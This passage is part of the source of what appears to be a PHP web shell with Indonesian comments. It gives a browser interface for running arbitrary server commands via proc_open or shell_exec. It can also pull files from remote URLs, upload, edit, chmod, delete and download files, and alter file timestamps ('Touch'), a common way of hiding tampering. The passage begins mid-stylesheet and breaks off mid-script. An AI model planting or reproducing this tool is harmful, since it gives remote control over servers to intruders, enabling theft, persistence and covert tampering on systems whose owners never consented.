        /* Perbaikan tampilan pesan */
        .message-container {
            position: fixed;
            top: 40px;
            right: 20px;
            z-index: 1000;
            max-width: 400px;
        }
        .message {
            padding: 12px 20px;
            margin-bottom: 10px;
            border-radius: 4px;
            font-weight: bold;
            box-shadow: 0 4px 8px rgba(0,0,0,0.3);
            animation: slideIn 0.3s ease-out;

            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;

            /* Tambahkan properti untuk interaksi */
            position: relative;
            cursor: pointer;
            transition: all 0.3s ease;
        }

        /* Kelas untuk notifikasi yang diperluas */
        .message.expanded {
            white-space: normal;
            max-height: none;
        }
        .message.success {
            background-color: rgba(0, 255, 0, 0.2);
            border-left: 4px solid #00FF00;
            color: #00FF00;
        }
        .message.error {
            background-color: rgba(255, 0, 0, 0.2);
            border-left: 4px solid #ff0000;
            color: #ff0000;
        }
        @keyframes slideIn {
            from {
                transform: translateX(100%);
                opacity: 0;
            }
            to {
                transform: translateX(0);
                opacity: 1;
            }
        }
        .message-close {
            float: right;
            cursor: pointer;
            font-weight: bold;
            margin-left: 15px;
        }
        
        /* Tampilan untuk pilihan metode command - tanpa background */
        .command-method-selector {
            display: flex;
            gap: 15px;
            margin-bottom: 10px;
        }
        .method-option {
            display: flex;
            align-items: center;
            cursor: pointer;
            font-size: 14px;
            color: #ccc;
        }
        .method-option input[type="radio"] {
            margin-right: 6px;
            cursor: pointer;
        }
        .method-option:hover {
            color: #ff6666;
        }
        .method-option input[type="radio"]:checked + span {
            color: #ff6666;
            font-weight: bold;
        }
        
        /* Keterangan untuk file info */
        .file-info-container {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 10px;
        }
        .file-info-details {
            font-size: 12px;
            color: #aaa;
        }
        
        input[type="text"], input[type="password"], textarea {
            background: black !important;
            border: 1px solid #444 !important;
            color: white !important;
            padding: 4px !important;
            font-size: 14px !important;
            cursor: text !important;
            transition: border-color 0.3s ease !important;
        }

        input[type="text"]:focus, input[type="password"]:focus, textarea:focus {
            border-color: #ff6666 !important;
            outline: none !important;
        }

        input[type="text"]::placeholder, input[type="password"]::placeholder, textarea::placeholder {
            color: #ccc !important;
        }

        /* CSS khusus untuk input Chmod */
        input[name="chmod_value"] {
            width: 50px !important;
            vertical-align: middle !important;
            text-align: center !important;
            font-family: monospace !important;
        }
        
        /* Style untuk form edit yang diperbaiki */
        .edit-header {
            display: flex;
            justify-content: space-between;
            align-items: center;
            margin-bottom: 15px;
            border-bottom: 1px solid #444;
            padding-bottom: 10px;
        }
        
        .edit-path {
            color: #ff6666;
            font-weight: bold;
        }
        
        .edit-footer {
            display: flex;
            justify-content: flex-start;
            align-items: center;
            margin-top: 15px;
            border-top: 1px solid #444;
            padding-top: 10px;
        }
        
        .edit-actions {
            display: flex;
            gap: 10px;
        }
        
        /* Style untuk form touch yang minimalis */
        .touch-container {
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            padding: 20px;
        }
        
        .touch-title {
            color: #ff6666;
            font-weight: bold;
            margin-bottom: 15px;
            font-size: 16px;
        }
        
        .touch-form-content {
            display: flex;
            flex-direction: column;
            align-items: center;
            gap: 15px;
        }
        
        .touch-actions {
            display: flex;
            gap: 10px;
            margin-top: 10px;
        }

        /* Efek khusus untuk selain baris navigasi */
        tbody tr:not(.nav-row):hover {
            background-color: #333 !important;
        }

        /* Tambahkan class untuk baris navigasi */
        .nav-row:hover {
            background-color: transparent !important;
            cursor: default;
            border-left: none;
        }

        /* Efek untuk checkbox saat hover */
        .file-row input[type="checkbox"]:hover {
            cursor: pointer;
        }

        /* CSS untuk input Chmod dengan warna sama seperti Rename to */
        input[name="chmod_value"] {
            background: black !important;
            border: 1px solid #444 !important;
            color: white !important;
            padding: 4px !important;
            font-size: 14px !important;
            cursor: text !important;
            width: 50px !important;
            vertical-align: middle !important;
            text-align: center !important;
            font-family: monospace !important;
        }

        input[name="chmod_value"]:focus {
            border-color: #ff6666 !important;
            outline: none !important;
        }

        input[name="chmod_value"]::placeholder {
            color: #ccc !important;
        }

        /* Efek untuk checkbox saat hover */
        .file-row input[type="checkbox"]:hover {
            cursor: pointer;
        }

        /* CSS untuk semua input form dengan border merah saat focus */
        input[type="text"], input[type="password"], textarea {
            background: black !important;
            border: 1px solid #444 !important;
            color: white !important;
            padding: 4px !important;
            font-size: 14px !important;
            cursor: text !important;
            transition: border-color 0.3s ease !important;
        }

        input[type="text"]:focus, input[type="password"]:focus, textarea:focus {
            border-color: #ff6666 !important;
            outline: none !important;
        }

        input[type="text"]::placeholder, input[type="password"]::placeholder, textarea::placeholder {
            color: #ccc !important;
        }

        /* CSS khusus untuk input Chmod */
        input[name="chmod_value"] {
            width: 50px !important;
            vertical-align: middle !important;
            text-align: center !important;
            font-family: monospace !important;
        }

        /* Custom file input untuk Upload */
        .file-input-wrapper {
            position: relative;
            display: inline-flex;
            align-items: center;
            border-bottom: 1px solid #555;
            padding-bottom: 4px;
            min-width: 220px;
            margin-right: 10px;
        }

        .file-input-wrapper input[type="file"] {
            position: absolute;
            left: 0;
            top: 0;
            opacity: 0;
            width: 100%;
            height: 100%;
            cursor: pointer;
        }

        .file-input-label {
            padding: 6px 8px;
            background: transparent;
            color: #ddd;
            font-size: 14px;
            cursor: pointer;
            transition: color 0.3s ease;
            width: 100%;
            font-family: monospace;
        }

        .file-input-label:hover {
            color: #fff;
        }

        .file-input-label:active {
            color: #d33;
        }

        /* Style untuk tombol Apply dan Upload */
        .btn-apply, .btn-upload {
            background: linear-gradient(135deg, #b22222, #d33);
            border: none;
            color: #fff;
            padding: 6px 14px;
            border-radius: 4px;
            cursor: pointer;
            transition: background 0.3s ease, transform 0.1s;
            font-weight: bold;
            font-family: monospace;
        }

        .btn-apply:hover, .btn-upload:hover {
            background: linear-gradient(135deg, #d33, #e74c3c);
        }

        .btn-apply:active, .btn-upload:active {
            transform: scale(0.97);
        }

        /* Custom select untuk Pilih aksi */
        select[name="bulk_action"] {
            padding: 6px 8px;
            border: none;
            background: #222; /* Mengganti background dari transparent ke #222 */
            color: #ddd;
            outline: none;
            font-size: 14px;
            transition: color 0.2s, border-color 0.2s;
            border-bottom: 1px solid #555;
            min-width: 220px;
            font-family: monospace;
            border-radius: 4px; /* Menambahkan radius untuk tampilan yang lebih baik */
        }

        select[name="bulk_action"]:hover {
            color: #fff;
            background: #333; /* Menambahkan background saat hover */
        }

        select[name="bulk_action"]:focus {
            color: #fff;
            border-bottom: 1px solid #d33;
            background: #333; /* Menambahkan background saat focus */
        }

        /* Menambahkan styling untuk opsi dropdown */
        select[name="bulk_action"] option {
            background: #222;
            color: #ddd;
        }

        select[name="bulk_action"] option:hover {
            background: #444;
            color: #fff;
        }


        /* Custom file input untuk Upload */
        .file-input-wrapper {
            position: relative;
            display: inline-flex;
            align-items: center;
            border-bottom: 1px solid #555;
            padding-bottom: 4px;
            min-width: 220px;
            margin-right: 10
        }

        /* CSS untuk modal konfirmasi */
        #confirmModal {
            display: none;
            position: fixed;
            z-index: 1000;
            left: 0;
            top: 0;
            width: 100%;
            height: 100%;
            background-color: rgba(0,0,0,0.7);
            font-family: monospace;
        }

        #confirmModal .modal-content {
            background-color: #222;
            margin: 15% auto;
            padding: 20px;
            border: 1px solid #444;
            width: 350px;
            text-align: center;
            border-radius: 5px;
            box-shadow: 0 4px 8px rgba(0,0,0,0.5);
        }

        #confirmModal h3 {
            margin-top: 0;
            color: #ff6666;
            font-family: monospace;
        }

        #confirmModal p {
            color: white;
            margin: 15px 0;
            font-family: monospace;
        }

        #confirmModal .modal-buttons {
            margin-top: 20px;
        }

        #confirmModal button {
            background: #aa2222;
            border: none;
            color: white;
            padding: 8px 20px;
            margin: 0 10px;
            cursor: pointer;
            border-radius: 3px;
            font-family: monospace;
            transition: background 0.3s;
        }

        #confirmModal button:hover {
            background: #dd4444;
        }

        #confirmModal #confirmNo {
            background: #444;
        }

        #confirmModal #confirmNo:hover {
            background: #666;
        }
    </style>
</head>
<body>

<?php
if (isset($_SESSION['delete_debug_message'])) {
    echo '<div class="debug-message">' . $_SESSION['delete_debug_message'] . '</div>';
    unset($_SESSION['delete_debug_message']);
}
?>

<div>
    <strong>Current Directory:</strong> <?php echo makeBreadcrumb($current_dir); ?>
    <form method="POST" style="display:inline;">
        <button type="submit" name="go_dir" value="<?php echo htmlspecialchars(getcwd()); ?>" style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;margin-left:10px;">[ Home ]</button>
    </form>
    <form method="POST" style="display:inline; float:right;">
        <button type="submit" name="logout" style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;margin-left:10px;">Logout</button>
    </form>
</div>
<hr>

<!-- Container untuk pesan sukses/error -->
<div class="message-container" id="messageContainer"></div>

<div class="command-form">
    <h3>Execute Command</h3>
    
    <!-- Form untuk memilih metode command -->
    <form method="POST" style="margin-bottom:5px;">
        <div class="command-method-selector">
            <?php
            $shell_exec_available = function_exists('shell_exec');
            $proc_open_available = function_exists('proc_open');
            
            if ($proc_open_available):
            ?>
            <label class="method-option">
                <input type="radio" name="command_method" value="proc_open" <?php echo ($command_method === 'proc_open') ? 'checked' : ''; ?> onchange="this.form.submit()">
                <span>proc_open (Default)</span>
            </label>
            <?php endif; ?>
            
            <?php if ($shell_exec_available): ?>
            <label class="method-option">
                <input type="radio" name="command_method" value="shell_exec" <?php echo ($command_method === 'shell_exec') ? 'checked' : ''; ?> onchange="this.form.submit()">
                <span>shell_exec</span>
            </label>
            <?php endif; ?>
            
            <?php if (!$shell_exec_available && !$proc_open_available): ?>
            <span style="color: #ff6666;">No command execution methods available</span>
            <?php endif; ?>
        </div>
    </form>
    
    <?php if ($shell_exec_available || $proc_open_available): ?>
    <!-- Form untuk eksekusi command -->
    <form method="POST" style="margin-bottom:10px;">
        <input type="hidden" name="command_method" value="<?php echo htmlspecialchars($command_method); ?>">
        <input type="text" name="command" style="width:80%" required>
        <input type="submit" value="Run">
    </form>
    <?php else: ?>
    <div style="color: #ff6666; margin-bottom: 10px;">
        Command execution is not available on this server.
    </div>
    <?php endif; ?>
    
    <?php if ($cmdout): ?>
        <?php echo $cmdout; ?>
    <?php endif; ?>
</div>

<!-- Form Edit -->
<div id="editFormContainer" class="form-container">
    <div class="edit-header">
        <h3>Edit: <span id="editFileName" class="edit-path"></span></h3>
    </div>
    <form method="POST" class="edit-form" id="editForm">
        <input type="hidden" name="save_edit_file" id="saveEditPath">
        <textarea name="edit_content" id="editContent"></textarea>
    </form>
    <div class="edit-footer">
        <div class="edit-actions">
            <input type="submit" form="editForm" value="Save">
            <input type="button" value="Cancel" onclick="hideEditForm()">
        </div>
    </div>
</div>

<div class="action-row">
    <form method="POST">
        <input type="text" name="get_file_url" placeholder="URL Link" required style="width:200px;">
        <input type="text" name="get_file_name" placeholder="Nama File" required style="width:150px;">
        <input type="submit" value="Get">
    </form>
    
    <form method="POST" enctype="multipart/form-data" style="display:inline-flex; align-items: center;">
        <div class="file-input-wrapper">
            <label for="uploadfile" class="file-input-label" id="fileLabel">Choose file...</label>
            <input type="file" name="uploadfile" id="uploadfile" onchange="updateFileName(this)" required>
        </div>
        <input type="submit" value="Upload" class="btn-upload">
    </form>

    <form method="POST">
        <input type="text" name="newfolder_name" placeholder="Nama folder baru" required>
        <input type="submit" value="Buat Folder">
    </form>

    <form method="POST">
        <input type="text" name="newfile_name" placeholder="Nama file baru" required>
        <input type="submit" name="create_file" value="Buat File">
    </form>

    <form method="POST" id="deleteActionForm">
        <input type="hidden" name="delete_single_item" value="1">
        <input type="text" name="delete_item_name" placeholder="Path file/folder untuk dihapus" required>
        <button type="button" onclick="showDeleteActionConfirm()" class="action-btn">Hapus File/Folder</button>
    </form>
</div>

<!-- View File Section -->
<div id="viewFileSection" class="form-container" style="<?php echo ($view_file !== null && $edit_file === null) ? 'display: block;' : 'display: none;'; ?>">
    <div class="file-info-container">
        <h3>Viewing File: <?php echo htmlspecialchars($view_file); ?></h3>
    </div>
    <pre class="file-content"><?php echo htmlspecialchars($view_content); ?></pre>
    <div class="actions-cell view-actions">
        <form method="POST" style="display:inline;">
            <input type="hidden" name="download" value="<?php echo htmlspecialchars($view_file); ?>">
            <button type="submit" class="action-btn">Download</button>
        </form>
        <form method="POST" style="display:inline;" id="chmodFormView">
            <input type="hidden" name="chmod" value="<?php echo htmlspecialchars($view_file); ?>">
            <input type="text" name="chmod_value" placeholder="<?php echo getPermsOctal($view_file); ?>" pattern="[0-7]{3,4}" required style="width:50px; vertical-align: middle;" value="<?php echo getPermsOctal($view_file); ?>">
            <button type="button" onclick="showChmodConfirm('chmodFormView', '<?php echo htmlspecialchars(basename($view_file)); ?>')" class="action-btn">Chmod</button>
        </form>
        <form method="POST" style="display:inline;">
            <input type="hidden" name="rename" value="<?php echo htmlspecialchars($view_file); ?>">
            <input type="text" name="rename_new" placeholder="Rename to" required style="width:120px; vertical-align: middle;">
            <button type="submit" class="action-btn">Rename</button>
        </form>
        <form method="POST" style="display:inline;" onsubmit="return false;">
            <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($view_file); ?>">
            <button type="button" class="action-btn" onclick="showEditForm('<?php echo htmlspecialchars($view_file); ?>')">Edit</button>
        </form>
        <form method="POST" style="display:inline;" onsubmit="return false;">
            <input type="hidden" name="touch_file" value="<?php echo htmlspecialchars($view_file); ?>">
            <button type="button" class="action-btn" onclick="showTouchForm('<?php echo htmlspecialchars($view_file); ?>', '<?php echo date("Y-m-d H:i:s", filemtime($view_file)); ?>')">Touch</button>
        </form>
        <form method="POST" style="display:inline;">
            <input type="hidden" name="close_view_file" value="1">
            <button type="submit" class="action-btn">Close</button>
        </form>
    </div>
</div>

<!-- Form Touch -->
<div id="touchFormContainer" class="form-container">
    <div class="touch-container">
        <div class="touch-title">Touch: <span id="touchFileName"></span></div>
        <div class="touch-form-content">
            <form method="POST" class="touch-form" id="touchForm">
                <input type="hidden" name="save_touch" id="saveTouchPath">
                <input type="text" name="touch_value" id="touchValue" class="touch-input" pattern="\d{4}-\d{2}-\d{2} \d{2}:\d{2}:\d{2}" required>
            </form>
            <div class="touch-actions">
                <input type="submit" form="touchForm" value="Save">
                <input type="button" value="Cancel" onclick="hideTouchForm()">
            </div>
        </div>
    </div>
</div>

<!-- Modal Konfirmasi -->
<div id="confirmModal">
    <div class="modal-content">
        <h3>Confirm Action</h3>
        <p id="confirmMessage">Are you sure you want to proceed?</p>
        <div class="modal-buttons">
            <button id="confirmYes">Yes</button>
            <button id="confirmNo">No</button>
        </div>
    </div>
</div>

<form method="POST" id="bulkForm">
    <table>
        <thead>
            <tr>
                <th class="checkbox-col"><input type="checkbox" id="checkAll" title="Pilih semua"></th>
                <th>Nama</th>
                <th>Ukuran</th>
                <th>User:Group</th>
                <th>Izin</th>
                <th>Dimodifikasi</th>
                <th class="actions-cell">Aksi</th>
            </tr>
        </thead>
        <tbody>
<!-- Baris navigasi untuk direktori saat ini (.) -->
<tr class="nav-row">
    <td class="checkbox-col"></td>
    <td>
        <form method="POST" style="display:inline;">
            <button type="submit" name="go_dir" value="<?php echo htmlspecialchars($current_dir); ?>" style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;">.</button>
        </form>
    </td>
    <td>Directory</td>
    <td>
        <?php
        $current_dir_owner = fileowner($current_dir);
        $current_dir_group = filegroup($current_dir);
        $current_dir_owner_name = function_exists('posix_getpwuid') ? posix_getpwuid($current_dir_owner)['name'] : $current_dir_owner;
        $current_dir_group_name = function_exists('posix_getgrgid') ? posix_getgrgid($current_dir_group)['name'] : $current_dir_group;
        echo htmlspecialchars($current_dir_owner_name . ':' . $current_dir_group_name);
        ?>
    </td>
    <td>
        <?php
        $current_dir_perms = fileperms($current_dir);
        echo permsToString($current_dir_perms, $current_dir, $current_uid, $current_gid);
        ?>
    </td>
    <td>
        <span class="clickable-date" onclick="showTouchForm('<?php echo htmlspecialchars($current_dir); ?>', '<?php echo date("Y-m-d H:i:s", filemtime($current_dir)); ?>')">
            <?php echo date("Y-m-d H:i:s", filemtime($current_dir)); ?>
        </span>
    </td>
    <td class="actions-cell">
        <form method="POST" style="display:inline;" id="chmodFormCurrent">
            <input type="hidden" name="chmod" value="<?php echo htmlspecialchars($current_dir); ?>">
            <input type="text" name="chmod_value" placeholder="<?php echo getPermsOctal($current_dir); ?>" pattern="[0-7]{3,4}" required style="width:50px; vertical-align: middle;" value="<?php echo getPermsOctal($current_dir); ?>">
            <button type="button" onclick="showChmodConfirm('chmodFormCurrent', '<?php echo htmlspecialchars(basename($current_dir)); ?>')" class="action-btn">Chmod</button>
        </form>
    </td>
</tr>

<!-- Baris navigasi untuk direktori sebelumnya (..) -->
<?php
$parent_dir = dirname($current_dir);
if ($parent_dir && is_dir($parent_dir) && $parent_dir !== $current_dir):
?>
<tr>
    <td class="checkbox-col"></td>
    <td>
        <form method="POST" style="display:inline;">
            <button type="submit" name="go_dir" value="<?php echo htmlspecialchars($parent_dir); ?>" style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;">..</button>
        </form>
    </td>
    <td>Directory</td>
    <td>
        <?php
        $parent_dir_owner = fileowner($parent_dir);
        $parent_dir_group = filegroup($parent_dir);
        $parent_dir_owner_name = function_exists('posix_getpwuid') ? posix_getpwuid($parent_dir_owner)['name'] : $parent_dir_owner;
        $parent_dir_group_name = function_exists('posix_getgrgid') ? posix_getgrgid($parent_dir_group)['name'] : $parent_dir_group;
        echo htmlspecialchars($parent_dir_owner_name . ':' . $parent_dir_group_name);
        ?>
    </td>
    <td>
        <?php
        $parent_dir_perms = fileperms($parent_dir);
        echo permsToString($parent_dir_perms, $parent_dir, $current_uid, $current_gid);
        ?>
    </td>
    <td>
        <span class="clickable-date" onclick="showTouchForm('<?php echo htmlspecialchars($parent_dir); ?>', '<?php echo date("Y-m-d H:i:s", filemtime($parent_dir)); ?>')">
            <?php echo date("Y-m-d H:i:s", filemtime($parent_dir)); ?>
        </span>
    </td>
    <td class="actions-cell">
        <form method="POST" style="display:inline;" id="chmodFormParent">
            <input type="hidden" name="chmod" value="<?php echo htmlspecialchars($parent_dir); ?>">
            <input type="text" name="chmod_value" placeholder="<?php echo getPermsOctal($parent_dir); ?>" pattern="[0-7]{3,4}" required style="width:50px; vertical-align: middle;" value="<?php echo getPermsOctal($parent_dir); ?>">
            <button type="button" onclick="showChmodConfirm('chmodFormParent', '<?php echo htmlspecialchars(basename($parent_dir)); ?>')" class="action-btn">Chmod</button>
        </form>
    </td>
</tr>
<?php endif; ?>

<?php
$items = scandir($current_dir);
$folders = array();
$files = array();
foreach ($items as $item) {
    if ($item === '.' || $item === '..') continue;
    $fullpath = $current_dir . DIRECTORY_SEPARATOR . $item;
    if (is_dir($fullpath)) {
        $folders[] = $item;
    } else {
        $files[] = $item;
    }
}

$current_uid = function_exists('posix_geteuid') ? posix_geteuid() : null;
$current_gid = function_exists('posix_getegid') ? posix_getegid() : null;

$i = 0;
foreach ($folders as $item):
    $fullpath = $current_dir . DIRECTORY_SEPARATOR . $item;
    $perms_octal = fileperms($fullpath);
    $perms_string = permsToString($perms_octal, $fullpath, $current_uid, $current_gid);
    $size = 'Directory';
    $mod = date("Y-m-d H:i:s", filemtime($fullpath));

    $owner_id = fileowner($fullpath);
    $group_id = filegroup($fullpath);
    $owner_name = function_exists('posix_getpwuid') ? posix_getpwuid($owner_id)['name'] : $owner_id;
    $group_name = function_exists('posix_getgrgid') ? posix_getgrgid($group_id)['name'] : $group_id;

    $user_group_class = (($owner_id !== $current_uid || $group_id !== $current_gid) && ($current_uid !== null || $current_gid !== null)) ? 'user-group-diff' : '';
?>
<tr>
    <td class="checkbox-col"><input type="checkbox" name="items[]" value="<?php echo htmlspecialchars($fullpath); ?>"></td>
    <td>
        <form method="POST" style="display:inline;">
            <button type="submit" name="go_dir" value="<?php echo htmlspecialchars($fullpath); ?>" style="background:none;border:none;color:#ff6666;cursor:pointer;padding:0;">
                <?php echo htmlspecialchars($item); ?>
            </button>
        </form>
    </td>
    <td><?php echo $size; ?></td>
    <td class="<?php echo $user_group_class; ?>"><?php echo htmlspecialchars($owner_name . ':' . $group_name); ?></td>
    <td><?php echo $perms_string; ?></td>
    <td><span class="clickable-date" onclick="showTouchForm('<?php echo htmlspecialchars($fullpath); ?>', '<?php echo htmlspecialchars($mod); ?>')"><?php echo $mod; ?></span></td>
    <td class="actions-cell">
        <form method="POST" style="display:inline;" id="chmodForm<?php echo $i; ?>">
            <input type="hidden" name="chmod" value="<?php echo htmlspecialchars($fullpath); ?>">
            <input type="text" name="chmod_value" placeholder="<?php echo getPermsOctal($fullpath); ?>" pattern="[0-7]{3,4}" required style="width:50px; vertical-align: middle;" value="<?php echo getPermsOctal($fullpath); ?>">
            <button type="button" onclick="showChmodConfirm('chmodForm<?php echo $i; ?>', '<?php echo htmlspecialchars(basename($fullpath)); ?>')" class="action-btn">Chmod</button>
        </form>
        <form method="POST" style="display:inline;">
            <input type="hidden" name="rename" value="<?php echo htmlspecialchars($fullpath); ?>">
            <input type="text" name="rename_new" placeholder="Rename to" required style="width:120px; vertical-align: middle;">
            <button type="submit" class="action-btn">Rename</button>
        </form>
        <!-- Untuk folder -->
        <form method="POST" style="display:inline;" id="deleteForm<?php echo $i; ?>">
            <input type="hidden" name="delete_single_item" value="1">
            <input type="hidden" name="delete_item_name" value="<?php echo htmlspecialchars($fullpath); ?>">
            <button type="button" onclick="showDeleteConfirm('deleteForm<?php echo $i; ?>', '<?php echo htmlspecialchars($item); ?>', 'folder')" class="action-btn">Delete</button>
        </form>
    </td>
</tr>
<?php 
$i++;
endforeach; ?>

<?php
foreach ($files as $item):
    $fullpath = $current_dir . DIRECTORY_SEPARATOR . $item;
    $perms_octal = fileperms($fullpath);
    $perms_string = permsToString($perms_octal, $fullpath, $current_uid, $current_gid);
    $size = formatSize(filesize($fullpath));
    $mod = date("Y-m-d H:i:s", filemtime($fullpath));

    $owner_id = fileowner($fullpath);
    $group_id = filegroup($fullpath);
    $owner_name = function_exists('posix_getpwuid') ? posix_getpwuid($owner_id)['name'] : $owner_id;
    $group_name = function_exists('posix_getgrgid') ? posix_getgrgid($group_id)['name'] : $group_id;

    $user_group_class = (($owner_id !== $current_uid || $group_id !== $current_gid) && ($current_uid !== null || $current_gid !== null)) ? 'user-group-diff' : '';
?>
<tr>
    <td class="checkbox-col"><input type="checkbox" name="items[]" value="<?php echo htmlspecialchars($fullpath); ?>"></td>
    <td>
        <form method="POST" style="display:inline;">
            <button type="submit" name="view_file" value="<?php echo htmlspecialchars($fullpath); ?>" style="background:none;border:none;color:white;cursor:pointer;padding:0;">
                <?php echo htmlspecialchars($item); ?>
            </button>
        </form>
    </td>
    <td><?php echo $size; ?></td>
    <td class="<?php echo $user_group_class; ?>"><?php echo htmlspecialchars($owner_name . ':' . $group_name); ?></td>
    <td><?php echo $perms_string; ?></td>
    <td><span class="clickable-date" onclick="showTouchForm('<?php echo htmlspecialchars($fullpath); ?>', '<?php echo htmlspecialchars($mod); ?>')"><?php echo $mod; ?></span></td>
    <td class="actions-cell">
        <form method="POST" style="display:inline;" id="chmodForm<?php echo $i; ?>">
            <input type="hidden" name="chmod" value="<?php echo htmlspecialchars($fullpath); ?>">
            <input type="text" name="chmod_value" placeholder="<?php echo getPermsOctal($fullpath); ?>" pattern="[0-7]{3,4}" required style="width:50px; vertical-align: middle;" value="<?php echo getPermsOctal($fullpath); ?>">
            <button type="button" onclick="showChmodConfirm('chmodForm<?php echo $i; ?>', '<?php echo htmlspecialchars(basename($fullpath)); ?>')" class="action-btn">Chmod</button>
        </form>
        <form method="POST" style="display:inline;">
            <input type="hidden" name="rename" value="<?php echo htmlspecialchars($fullpath); ?>">
            <input type="text" name="rename_new" placeholder="Rename to" required style="width:120px; vertical-align: middle;">
            <button type="submit" class="action-btn">Rename</button>
        </form>
        <form method="POST" style="display:inline;" onsubmit="return false;">
            <input type="hidden" name="edit_file" value="<?php echo htmlspecialchars($fullpath); ?>">
            <button type="button" class="action-btn" onclick="showEditForm('<?php echo htmlspecialchars($fullpath); ?>')">Edit</button>
        </form>
        <!-- Untuk file -->
        <form method="POST" style="display:inline;" id="deleteForm<?php echo $i; ?>">
            <input type="hidden" name="delete_single_item" value="1">
            <input type="hidden" name="delete_item_name" value="<?php echo htmlspecialchars($fullpath); ?>">
            <button type="button" onclick="showDeleteConfirm('deleteForm<?php echo $i; ?>', '<?php echo htmlspecialchars($item); ?>', 'file')" class="action-btn">Delete</button>
        </form>
        <form method="POST" style="display:inline;">
            <input type="hidden" name="download" value="<?php echo htmlspecialchars($fullpath); ?>">
            <button type="submit" class="action-btn">Download</button>
        </form>
    </td>
</tr>
<?php 
$i++;
endforeach;
?>
        </tbody>
    </table>
    
    <div class="action-row">
        <select name="bulk_action">
            <option value="">Pilih aksi</option>
            <option value="delete">Delete</option>
            <option value="zip">Compress (ZIP)</option>
            <option value="tar">Compress (TAR.GZ)</option>
            <option value="unzip">Extract (ZIP)</option>
            <option value="untar">Extract (TAR.GZ)</option>
        </select>
        <input type="submit" value="Apply" class="btn-apply">
    </div>
</form>

<script>
function showMessage(message, type) {
    const messageContainer = document.getElementById('messageContainer');
    const messageElement = document.createElement('div');
    messageElement.className = 'message ' + type;
    messageElement.setAttribute('data-full-text', message);
    messageElement.innerHTML = message + '<span class="message-close" onclick="this.parentElement.remove()">×</span>';
    
    // Tambahkan event listener untuk klik
    messageElement.addEventListener('click', function(e) {
        // Jangan ekspansi jika yang diklik adalah tombol close
        if (!e.target.classList.contains('message-close')) {
            this.classList.toggle('expanded');
        }
    });
    
    messageContainer.appendChild(messageElement);
    
    // Hapus pesan setelah 5 detik
    setTimeout(() => {
        messageElement.remove();
    }, 5000);
}

// Tampilkan pesan dari session jika ada
<?php if (isset($_SESSION['message'])): ?>
    showMessage('<?php echo addslashes($_SESSION['message']['text']); ?>', '<?php echo $_SESSION['message']['type']; ?>');
    <?php unset($_SESSION['message']); ?>
<?php endif; ?>

// Fungsi untuk checkbox select all
document.getElementById('checkAll').addEventListener('change', function() {
    const checkboxes = document.querySelectorAll('input[name="items[]"]');
    checkboxes.forEach(checkbox => {
        checkbox.checked = this.checked;
    });
});

// Fungsi untuk scroll ke atas
function scrollToTop() {
    window.scrollTo({
        top: 0,
        behavior: 'smooth'
    });
}

// Fungsi untuk menutup semua form
function closeAllForms() {
    document.getElementById('viewFileSection').style.display = 'none';
    document.getElementById('editFormContainer').style.display = 'none';
    document.getElementById('touchFormContainer').style.display = 'none';
}

// Fungsi untuk menampilkan form touch
function showTouchForm(filePath, currentTimestamp) {
    // Tutup semua form lain
    closeAllForms();
    
    // Tampilkan form touch
    document.getElementById('touchFormContainer').style.display = 'block';
    document.getElementById('touchFileName').textContent = filePath;
    document.getElementById('saveTouchPath').value = filePath;
    document.getElementById('touchValue').value = currentTimestamp;
    
    // Scroll ke atas dengan sedikit delay untuk memastikan form sudah muncul
    setTimeout(scrollToTop, 10);
}

// Fungsi untuk menyembunyikan form touch
function hideTouchForm() {
    document.getElementById('touchFormContainer').style.display = 'none';
}

// Fungsi untuk menampilkan form edit
function showEditForm(filePath) {
    // Tutup semua form lain
    closeAllForms();
    
    // Tampilkan form edit
    document.getElementById('editFormContainer').style.display = 'block';
    
    // Set nilai path file
    document.getElementById('saveEditPath').value = filePath;
    
    // Set nama file
    document.getElementById('editFileName').textContent = filePath;
    
    // Ambil konten file via AJAX
    var xhr = new XMLHttpRequest();
    xhr.onreadystatechange = function() {
        if (xhr.readyState === 4) {
            if (xhr.status === 200) {
                document.getElementById('editContent').value = xhr.responseText;
            } else {
                alert('Gagal memuat konten file');
            }
        }
    };
    xhr.open('GET', '?get_file_content=' + encodeURIComponent(filePath), true);
    xhr.send();
    
    // Scroll ke atas
    scrollToTop();
}

// Tambahkan event listener untuk form edit
document.addEventListener('DOMContentLoaded', function() {
    const editForm = document.getElementById('editForm');
    if (editForm) {
        editForm.addEventListener('submit', function(e) {
            const content = document.getElementById('editContent').value;
            
            // Jika konten kosong, tampilkan konfirmasi
            if (content.trim() === '') {
                e.preventDefault();
                
                if (confirm('Are you sure you want to save an empty file?')) {
                    // Lanjutkan submit form
                    this.submit();
                }
            }
        });
    }
});

// Fungsi untuk menyembunyikan form edit
function hideEditForm() {
    document.getElementById('editFormContainer').style.display = 'none';
}

// Override fungsi showTouchForm asli
window.showTouchForm = function(filePath, currentTimestamp) {
    // Tutup semua form lain
    closeAllForms();
    
    // Tampilkan form touch
    document.getElementById('touchFormContainer').style.display = 'block';
    document.getElementById('touchFileName').textContent = filePath;
    document.getElementById('saveTouchPath').value = filePath;
    document.getElementById('touchValue').value = currentTimestamp;
    
    // Scroll ke atas dengan sedikit delay untuk memastikan form sudah muncul
    setTimeout(scrollToTop, 10);
};

// Variabel untuk modal konfirmasi
var currentFormId = null;
var currentAction = null;

// Fungsi untuk menampilkan konfirmasi Chmod
function showChmodConfirm(formId, fileName) {
    currentFormId = formId;
    currentAction = 'chmod';
    document.getElementById('confirmMessage').textContent = 
        'Are you sure you want to change permissions for "' + fileName + '"?';
    document.getElementById('confirmModal').style.display = 'block';
}

// Fungsi untuk menampilkan konfirmasi Delete dari kolom Aksi
function showDeleteConfirm(formId, itemName, itemType) {
    currentFormId = formId;
    currentAction = 'delete';
    document.getElementById('confirmMessage').textContent = 
        'Are you sure you want to delete the ' + itemType + ' "' + itemName + '"?';
    document.getElementById('confirmModal').style.display = 'block';
}

// Fungsi untuk menampilkan konfirmasi Delete dari action-row
function showDeleteActionConfirm() {
    const deleteForm = document.getElementById('deleteActionForm');
    const deletePath = deleteForm.querySelector('input[name="delete_item_name"]').value;
    
    if (!deletePath) {
        showMessage('Please enter a file/folder path to delete', 'error');
        return;
    }
    
    currentFormId = 'deleteActionForm';
